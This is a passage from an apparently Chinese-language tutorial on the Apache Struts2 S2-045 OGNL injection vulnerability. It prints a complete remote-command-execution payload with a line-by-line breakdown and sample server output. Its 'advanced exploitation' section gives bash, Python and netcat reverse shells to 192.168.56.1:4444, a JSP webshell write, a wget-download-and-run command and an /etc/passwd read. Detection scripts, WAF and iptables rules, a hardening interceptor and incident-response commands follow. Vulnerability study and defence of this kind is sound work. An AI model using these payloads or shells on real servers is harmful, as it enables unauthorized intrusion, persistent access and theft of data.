class=\"hljs-number\">5.0</span> (compatible; <span class=\"hljs-type\">MSIE</span> <span class=\"hljs-number\">9.0</span>; <span class=\"hljs-type\">Windows</span> <span class=\"hljs-type\">NT</span> <span class=\"hljs-number\">6.1</span>; <span class=\"hljs-type\">Win64</span>; x64)<br><span class=\"hljs-type\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class=\"hljs-number\">0.9</span>,*/*;q=<span class=\"hljs-number\">0.8</span><br><span class=\"hljs-type\">Connection</span>: close<br><span class=\"hljs-type\">Content</span>-<span class=\"hljs-type\">Type</span>: %&#123;<br>    (<span class=\"hljs-symbol\">#nike</span>=<span class=\"hljs-string\">&#x27;multipart/form-data&#x27;</span>).<br>    (<span class=\"hljs-symbol\">#dm</span>=@ognl.<span class=\"hljs-type\">OgnlContext</span>@<span class=\"hljs-type\">DEFAULT_MEMBER_ACCESS</span>).<br>    (<span class=\"hljs-symbol\">#_memberAccess</span>?(<span class=\"hljs-symbol\">#_memberAccess</span>=<span class=\"hljs-symbol\">#dm</span>):(<br>        (<span class=\"hljs-symbol\">#container</span>=<span class=\"hljs-symbol\">#context</span>[<span class=\"hljs-string\">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).<br>        (<span class=\"hljs-symbol\">#ognlUtil</span>=<span class=\"hljs-symbol\">#container</span>.getInstance(@com.opensymphony.xwork2.ognl.<span class=\"hljs-type\">OgnlUtil</span>@class)).<br>        (<span class=\"hljs-symbol\">#ognlUtil</span>.getExcludedPackageNames().clear()).<br>        (<span class=\"hljs-symbol\">#ognlUtil</span>.getExcludedClasses().clear()).<br>        (<span class=\"hljs-symbol\">#context</span>.setMemberAccess(<span class=\"hljs-symbol\">#dm</span>))<br>    )).<br>    (<span class=\"hljs-symbol\">#cmd</span>=<span class=\"hljs-string\">&#x27;whoami&#x27;</span>).<br>    (<span class=\"hljs-symbol\">#iswin</span>=(@java.lang.<span class=\"hljs-type\">System</span>@getProperty(<span class=\"hljs-string\">&#x27;os.name&#x27;</span>).toLowerCase().contains(<span class=\"hljs-string\">&#x27;win&#x27;</span>))).<br>    (<span class=\"hljs-symbol\">#cmds</span>=(<span class=\"hljs-symbol\">#iswin</span>?&#123;<span class=\"hljs-string\">&#x27;cmd.exe&#x27;</span>,<span class=\"hljs-string\">&#x27;/c&#x27;</span>,<span class=\"hljs-symbol\">#cmd</span>&#125;:&#123;<span class=\"hljs-string\">&#x27;/bin/bash&#x27;</span>,<span class=\"hljs-string\">&#x27;-c&#x27;</span>,<span class=\"hljs-symbol\">#cmd</span>&#125;)).<br>    (<span class=\"hljs-symbol\">#p</span>=new java.lang.<span class=\"hljs-type\">ProcessBuilder</span>(<span class=\"hljs-symbol\">#cmds</span>)).<br>    (<span class=\"hljs-symbol\">#p</span>.redirectErrorStream(<span class=\"hljs-keyword\">true</span>)).<br>    (<span class=\"hljs-symbol\">#process</span>=<span class=\"hljs-symbol\">#p</span>.start()).<br>    (<span class=\"hljs-symbol\">#ros</span>=(@org.apache.struts2.<span class=\"hljs-type\">ServletActionContext</span>@getResponse().getOutputStream())).<br>    (@org.apache.commons.io.<span class=\"hljs-type\">IOUtils</span>@copy(<span class=\"hljs-symbol\">#process</span>.getInputStream(),<span class=\"hljs-symbol\">#ros</span>)).<br>    (<span class=\"hljs-symbol\">#ros</span>.flush())<br>&#125;<br><span class=\"hljs-type\">Content</span>-<span class=\"hljs-type\">Length</span>: <span class=\"hljs-number\">0</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"Payload逐行解析\"><a href=\"#Payload逐行解析\" class=\"headerlink\" title=\"Payload逐行解析\"></a>Payload逐行解析</h3><table>\n<thead>\n<tr>\n<th>表达式片段</th>\n<th>功能说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>#nike=&#39;multipart/form-data&#39;</code></td>\n<td>设置伪装的Content-Type</td>\n</tr>\n<tr>\n<td><code>#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</code></td>\n<td>获取默认成员访问权限</td>\n</tr>\n<tr>\n<td><code>#_memberAccess=#dm</code></td>\n<td>绕过Struts2的安全限制</td>\n</tr>\n<tr>\n<td><code>#container=#context[...]</code></td>\n<td>获取ActionContext容器</td>\n</tr>\n<tr>\n<td><code>#ognlUtil.getExcludedPackageNames().clear()</code></td>\n<td>清除包名黑名单</td>\n</tr>\n<tr>\n<td><code>#ognlUtil.getExcludedClasses().clear()</code></td>\n<td>清除类名黑名单</td>\n</tr>\n<tr>\n<td><code>#cmd=&#39;whoami&#39;</code></td>\n<td>定义要执行的命令</td>\n</tr>\n<tr>\n<td><code>#iswin=...contains(&#39;win&#39;)</code></td>\n<td>判断操作系统类型</td>\n</tr>\n<tr>\n<td><code>#cmds=(#iswin?&#123;...&#125;:&#123;...&#125;)</code></td>\n<td>根据系统类型构造命令参数</td>\n</tr>\n<tr>\n<td><code>#p=new ProcessBuilder(#cmds)</code></td>\n<td>创建进程构建器</td>\n</tr>\n<tr>\n<td><code>#process=#p.start()</code></td>\n<td>启动进程执行命令</td>\n</tr>\n<tr>\n<td><code>IOUtils@copy(...)</code></td>\n<td>将命令输出写入HTTP响应</td>\n</tr>\n</tbody></table>\n<h3 id=\"攻击效果演示\"><a href=\"#攻击效果演示\" class=\"headerlink\" title=\"攻击效果演示\"></a>攻击效果演示</h3><p><strong>请求发送后的响应</strong>:</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs http\"><span class=\"hljs-meta\">HTTP/1.1</span> <span class=\"hljs-number\">200</span> OK<br><span class=\"hljs-attribute\">Server</span><span class=\"hljs-punctuation\">: </span>Apache-Coyote/1.1<br><span class=\"hljs-attribute\">Content-Type</span><span class=\"hljs-punctuation\">: </span>text/html;charset=UTF-8<br><span class=\"hljs-attribute\">Content-Length</span><span class=\"hljs-punctuation\">: </span>9<br><span class=\"hljs-attribute\">Date</span><span class=\"hljs-punctuation\">: </span>Wed, 24 Jul 2025 08:30:45 GMT<br><span class=\"hljs-attribute\">Connection</span><span class=\"hljs-punctuation\">: </span>close<br><br><span class=\"language-haskell\"><span class=\"hljs-title\">www</span>-<span class=\"hljs-class\"><span class=\"hljs-keyword\">data</span></span></span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"高级利用技巧\"><a href=\"#高级利用技巧\" class=\"headerlink\" title=\"高级利用技巧\"></a>高级利用技巧</h2><h3 id=\"1-信息收集命令\"><a href=\"#1-信息收集命令\" class=\"headerlink\" title=\"1. 信息收集命令\"></a>1. 信息收集命令</h3><figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs autoit\"><span class=\"hljs-meta\"># 系统信息</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;uname -a&#x27;</span></span><br><br><span class=\"hljs-meta\"># 当前用户</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;id&#x27;</span></span><br><br><span class=\"hljs-meta\"># 网络配置</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;ifconfig&#x27;</span></span><br><br><span class=\"hljs-meta\"># 进程列表</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;ps aux&#x27;</span></span><br><br><span class=\"hljs-meta\"># 文件系统</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;ls -la /&#x27;</span></span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-反弹Shell\"><a href=\"#2-反弹Shell\" class=\"headerlink\" title=\"2. 反弹Shell\"></a>2. 反弹Shell</h3><figure class=\"highlight hsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs hsp\"><span class=\"hljs-meta\"># Bash反弹Shell</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;bash -i &gt;&amp; /dev/tcp/<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span>/<span class=\"hljs-number\">4444</span> <span class=\"hljs-number\">0</span>&gt;&amp;<span class=\"hljs-number\">1</span>&#x27;</span><br><br><span class=\"hljs-meta\"># Python反弹Shell</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;python -c <span class=\"hljs-string\">&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;192.168.56.1\\&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;]);&quot;</span>&#x27;</span><br><br><span class=\"hljs-meta\"># NC反弹Shell  </span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;nc -e /bin/sh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span> <span class=\"hljs-number\">4444</span>&#x27;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-文件操作\"><a href=\"#3-文件操作\" class=\"headerlink\" title=\"3. 文件操作\"></a>3. 文件操作</h3><figure class=\"highlight hsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs hsp\"><span class=\"hljs-meta\"># 读取敏感文件</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;cat /etc/passwd&#x27;</span><br><br><span class=\"hljs-meta\"># 写入WebShell</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;echo <span class=\"hljs-string\">&quot;&lt;%@ page import=\\&quot;java.io.*\\&quot; %&gt;&lt;% String cmd = request.getParameter(\\&quot;cmd\\&quot;); Process p = Runtime.getRuntime().exec(cmd); %&gt;&quot;</span> &gt; /tmp/shell.jsp&#x27;</span><br><br><span class=\"hljs-meta\"># 下载文件</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;wget http:<span class=\"hljs-comment\">//192.168.56.1:8000/shell.sh -O /tmp/shell.sh &amp;&amp; chmod +x /tmp/shell.sh &amp;&amp; /tmp/shell.sh&#x27;</span></span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"检测与防护\"><a href=\"#检测与防护\" class=\"headerlink\" title=\"检测与防护\"></a>检测与防护</h2><h3 id=\"漏洞检测脚本\"><a href=\"#漏洞检测脚本\" class=\"headerlink\" title=\"漏洞检测脚本\"></a>漏洞检测脚本</h3><figure class=\"highlight livescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs livescript\"><span class=\"hljs-comment\">#!/usr/bin/env python3</span><br><span class=\"hljs-keyword\">import</span> requests<br><span class=\"hljs-keyword\">import</span> sys<br><br>def check_s2_045(url):<br>    payload = <span class=\"hljs-string\">&quot;&quot;&quot;%&#123;</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#nike</span>=&#x27;multipart/form-data&#x27;).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#dm</span>=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#_memberAccess</span>?(<span class=\"hljs-subst\">#_memberAccess</span>=<span class=\"hljs-subst\">#dm</span>):(</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#container</span>=<span class=\"hljs-subst\">#context</span>[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#ognlUtil</span>=<span class=\"hljs-subst\">#container</span>.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#ognlUtil</span>.getExcludedPackageNames().clear()).</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#ognlUtil</span>.getExcludedClasses().clear()).</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#context</span>.setMemberAccess(<span class=\"hljs-subst\">#dm</span>))</span><br><span class=\"hljs-string\">        )).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#cmd</span>=&#x27;echo &quot;S2045_VULN_TEST&quot;&#x27;).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#iswin</span>=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#cmds</span>=(<span class=\"hljs-subst\">#iswin</span>?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,<span class=\"hljs-subst\">#cmd</span>&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,<span class=\"hljs-subst\">#cmd</span>&#125;)).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#p</span>=new java.lang.ProcessBuilder(<span class=\"hljs-subst\">#cmds</span>)).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#p</span>.redirectErrorStream(true)).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#process</span>=<span class=\"hljs-subst\">#p</span>.start()).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#ros</span>=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).</span><br><span class=\"hljs-string\">        (@org.apache.commons.io.IOUtils@copy(<span class=\"hljs-subst\">#process</span>.getInputStream(),<span class=\"hljs-subst\">#ros</span>)).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#ros</span>.flush())</span><br><span class=\"hljs-string\">    &#125;&quot;&quot;&quot;</span><br>    <br>    headers = &#123;<br>        <span class=\"hljs-string\">&#x27;Content-Type&#x27;</span>: payload,<br>        <span class=\"hljs-string\">&#x27;User-Agent&#x27;</span>: <span class=\"hljs-string\">&#x27;Mozilla/5.0 (compatible; S2-045-Scanner)&#x27;</span><br>    &#125;<br>    <br>    try:<br>        response = requests.get(url, headers=headers, timeout=<span class=\"hljs-number\">10</span>)<br>        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;S2045_VULN_TEST&quot;</span> <span class=\"hljs-keyword\">in</span> response.text:<br>            <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">&quot;[+] &#123;url&#125; is vulnerable to S2-045!&quot;</span>)<br>            <span class=\"hljs-keyword\">return</span> True<br>        else:<br>            <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">&quot;[-] &#123;url&#125; is not vulnerable to S2-045&quot;</span>)<br>            <span class=\"hljs-keyword\">return</span> False<br>    except Exception <span class=\"hljs-keyword\">as</span> e:<br>        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">&quot;[!] Error testing &#123;url&#125;: &#123;str(e)&#125;&quot;</span>)<br>        <span class=\"hljs-keyword\">return</span> False<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&quot;__main__&quot;</span>:<br>    <span class=\"hljs-keyword\">if</span> len(sys.argv) != <span class=\"hljs-number\">2</span>:<br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;Usage: python3 s2-045-check.py &lt;URL&gt;&quot;</span>)<br>        sys.exit(<span class=\"hljs-number\">1</span>)<br>    <br>    target_url = sys.argv[<span class=\"hljs-number\">1</span>]<br>    check_s2_045(target_url)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"安全防护措施\"><a href=\"#安全防护措施\" class=\"headerlink\" title=\"安全防护措施\"></a>安全防护措施</h3><h4 id=\"1-版本升级（根本解决方案）\"><a href=\"#1-版本升级（根本解决方案）\" class=\"headerlink\" title=\"1. 版本升级（根本解决方案）\"></a>1. 版本升级（根本解决方案）</h4><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-comment\"># 升级到安全版本</span><br><span class=\"hljs-attribute\">Apache</span> Struts <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">32</span>+ 或 <span class=\"hljs-number\">2.5.10.1</span>+<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"2-WAF规则配置\"><a href=\"#2-WAF规则配置\" class=\"headerlink\" title=\"2. WAF规则配置\"></a>2. WAF规则配置</h4><p><strong>ModSecurity规则</strong>:</p>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs 1c\"><span class=\"hljs-meta\"># 检测S2-045攻击特征</span><br>SecRule REQUEST_HEADERS<span class=\"hljs-punctuation\">:</span>Content<span class=\"hljs-punctuation\">-</span>Type <span class=\"hljs-string\">&quot;@detectSQLi&quot;</span> \\<br>    <span class=\"hljs-string\">&quot;id:1001,\\</span><br>    phase<span class=\"hljs-punctuation\">:</span><span class=\"hljs-number\">1</span><span class=\"hljs-punctuation\">,</span>\\<br>    block<span class=\"hljs-punctuation\">,</span>\\<br>    msg<span class=\"hljs-punctuation\">:</span>&#x27;Struts2 S2-045 Attack Detected&#x27;<span class=\"hljs-punctuation\">,</span>\\<br>    logdata<span class=\"hljs-punctuation\">:</span>&#x27;Content-Type: %&#123;MATCHED_VAR&#125;&#x27;<span class=\"hljs-punctuation\">,</span>\\<br>    tag<span class=\"hljs-punctuation\">:</span>&#x27;attack-sqli&#x27;<span class=\"hljs-punctuation\">,</span>\\<br>    tag<span class=\"hljs-punctuation\">:</span>&#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&#x27;<span class=\"hljs-string\">&quot;</span><br><br><span class=\"hljs-meta\"># 检测OGNL表达式</span><br>SecRule REQUEST_HEADERS<span class=\"hljs-punctuation\">:</span>Content<span class=\"hljs-punctuation\">-</span>Type <span class=\"hljs-string\">&quot;@contains %&#123;&quot;</span> \\<br>    <span class=\"hljs-string\">&quot;id:1002,\\</span><br>    phase<span class=\"hljs-punctuation\">:</span><span class=\"hljs-number\">1</span><span class=\"hljs-punctuation\">,</span>\\<br>    block<span class=\"hljs-punctuation\">,</span>\\<br>    msg<span class=\"hljs-punctuation\">:</span>&#x27;Potential OGNL Injection in Content-Type&#x27;<span class=\"hljs-string\">&quot;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-网络层防护\"><a href=\"#3-网络层防护\" class=\"headerlink\" title=\"3. 网络层防护\"></a>3. 网络层防护</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\"># iptables规则示例<br>iptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -<span class=\"hljs-selector-tag\">p</span> tcp <span class=\"hljs-attr\">--dport</span> <span class=\"hljs-number\">8080</span> -m string <span class=\"hljs-attr\">--string</span> &quot;%&#123;&quot; <span class=\"hljs-attr\">--algo</span> bm -j DROP<br>iptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -<span class=\"hljs-selector-tag\">p</span> tcp <span class=\"hljs-attr\">--dport</span> <span class=\"hljs-number\">8080</span> -m string <span class=\"hljs-attr\">--string</span> &quot;ognl&quot; <span class=\"hljs-attr\">--algo</span> bm -j DROP<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"4-应用层加固\"><a href=\"#4-应用层加固\" class=\"headerlink\" title=\"4. 应用层加固\"></a>4. 应用层加固</h4><figure class=\"highlight scala\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scala\"><span class=\"hljs-comment\">// 自定义拦截器</span><br>public <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">SecurityInterceptor</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title\">AbstractInterceptor</span> </span>&#123;<br>    <span class=\"hljs-meta\">@Override</span><br>    public <span class=\"hljs-type\">String</span> intercept(<span class=\"hljs-type\">ActionInvocation</span> invocation) <span class=\"hljs-keyword\">throws</span> <span class=\"hljs-type\">Exception</span> &#123;<br>        <span class=\"hljs-type\">HttpServletRequest</span> request = <span class=\"hljs-type\">ServletActionContext</span>.getRequest();<br>        <span class=\"hljs-type\">String</span> contentType = request.getContentType();<br>        <br>        <span class=\"hljs-keyword\">if</span> (contentType != <span class=\"hljs-literal\">null</span> &amp;&amp; contentType.contains(<span class=\"hljs-string\">&quot;%&#123;&quot;</span>)) &#123;<br>            <span class=\"hljs-keyword\">throw</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-type\">SecurityException</span>(<span class=\"hljs-string\">&quot;Malicious Content-Type detected&quot;</span>);<br>        &#125;<br>        <br>        <span class=\"hljs-keyword\">return</span> invocation.invoke();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"实战技巧与工具\"><a href=\"#实战技巧与工具\" class=\"headerlink\" title=\"实战技巧与工具\"></a>实战技巧与工具</h2><h3 id=\"BurpSuite插件开发\"><a href=\"#BurpSuite插件开发\" class=\"headerlink\" title=\"BurpSuite插件开发\"></a>BurpSuite插件开发</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs java\"><span class=\"hljs-comment\">// S2-045检测插件框架</span><br><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">S2045Scanner</span> <span class=\"hljs-keyword\">implements</span> <span class=\"hljs-title class_\">IScannerCheck</span> &#123;<br>    <span class=\"hljs-meta\">@Override</span><br>    <span class=\"hljs-keyword\">public</span> List&lt;IScanIssue&gt; <span class=\"hljs-title function_\">doActiveScan</span><span class=\"hljs-params\">(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint)</span> &#123;<br>        <span class=\"hljs-comment\">// 构造S2-045 payload</span><br>        <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">payload</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;)...&#125;&quot;</span>;<br>        <br>        <span class=\"hljs-comment\">// 发送测试请求</span><br>        <span class=\"hljs-type\">byte</span>[] checkRequest = insertionPoint.buildRequest(payload.getBytes());<br>        <span class=\"hljs-type\">IHttpRequestResponse</span> <span class=\"hljs-variable\">checkRequestResponse</span> <span class=\"hljs-operator\">=</span> callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);<br>        <br>        <span class=\"hljs-comment\">// 分析响应判断是否存在漏洞</span><br>        <span class=\"hljs-keyword\">if</span> (isVulnerable(checkRequestResponse)) &#123;<br>            <span class=\"hljs-keyword\">return</span> Collections.singletonList(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">CustomScanIssue</span>(<span class=\"hljs-comment\">/* ... */</span>));<br>        &#125;<br>        <br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"批量检测脚本\"><a href=\"#批量检测脚本\" class=\"headerlink\" title=\"批量检测脚本\"></a>批量检测脚本</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/bin/bash</span><br><span class=\"hljs-comment\"># S2-045批量检测脚本</span><br><br>targets=(<br>    <span class=\"hljs-string\">&quot;http://target1.com:8080&quot;</span><br>    <span class=\"hljs-string\">&quot;http://target2.com:8080&quot;</span><br>    <span class=\"hljs-string\">&quot;http://target3.com:8080&quot;</span><br>)<br><br><span class=\"hljs-keyword\">for</span> target <span class=\"hljs-keyword\">in</span> <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;targets[@]&#125;</span>&quot;</span>; <span class=\"hljs-keyword\">do</span><br>    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;Testing: <span class=\"hljs-variable\">$target</span>&quot;</span><br>    python3 s2-045-check.py <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$target</span>&quot;</span><br>    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;---&quot;</span><br><span class=\"hljs-keyword\">done</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"应急响应指南\"><a href=\"#应急响应指南\" class=\"headerlink\" title=\"应急响应指南\"></a>应急响应指南</h2><h3 id=\"1-漏洞确认\"><a href=\"#1-漏洞确认\" class=\"headerlink\" title=\"1. 漏洞确认\"></a>1. 漏洞确认</h3><figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gradle\"># 检查Struts2版本<br><span class=\"hljs-keyword\">find</span> <span class=\"hljs-regexp\">/ -name &quot;struts2-core-*.jar&quot; 2&gt;/</span>dev/<span class=\"hljs-keyword\">null</span><br><br># 检查访问日志中的攻击特征<br><span class=\"hljs-keyword\">grep</span> -E <span class=\"hljs-string\">&quot;Content-Type.*%\\&#123;&quot;</span> <span class=\"hljs-regexp\">/var/</span>log<span 